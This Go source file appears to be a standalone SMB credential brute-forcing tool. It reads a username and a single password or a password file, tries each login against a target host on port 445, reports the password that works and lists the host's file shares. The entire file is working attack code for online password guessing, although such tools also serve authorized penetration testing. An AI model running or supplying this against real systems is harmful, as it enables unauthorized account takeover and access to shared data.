package main

import (
	"net"
	"flag"
	"os"
	"bufio"
	"log"
	"fmt"
	
	"github.com/hirochachacha/go-smb2"
)

func main() {
	ip := flag.String("host", "", "host to connecto to (e.g. 10.10.10.10)")

	user := flag.String("u", "", "user to bruteforce")
	password := flag.String("p", "", "pass to bruteforce")
	
	pass_file := flag.String("P", "", "pass file to bruteforce")

	flag.Parse()

	if *pass_file != "" && *password != "" {
		log.Println("Can not use -p and -P together. Choose one.")
		return
	}
	
	if *pass_file != "" {
		file, err := os.Open(*pass_file)
		if err != nil {
			log.Println("Can not open file.")
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)

		for scanner.Scan() {
			line := scanner.Text()
			smb_bruteforce(*ip, *user, line)
		}

		if err := scanner.Err(); err != nil {
			log.Println("error reading the file.")
		}
		return
	}
	
	if *password != "" {
		smb_bruteforce(*ip, *user, *password)
		return
	}

}

func smb_bruteforce(ip string, user string, pass string) {
	conn, err := net.Dial("tcp", ip + ":445")
	if err != nil {
		return
	}
	defer conn.Close()
	
	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     user,
			Password: pass,
		},
	}

	s, err := d.Dial(conn)
	if err != nil {
		log.Println("Testing:", user, pass, "Wrong Pass..")
		return
	}
	defer s.Logoff()

	log.Println("Pass Found!:", user, pass, "\n")

	names, err := s.ListSharenames()
	if err != nil {
		return
	}

		
	fmt.Println("Here the Shares:")
	for _, name := range names {
		fmt.Println(name)
	}
}
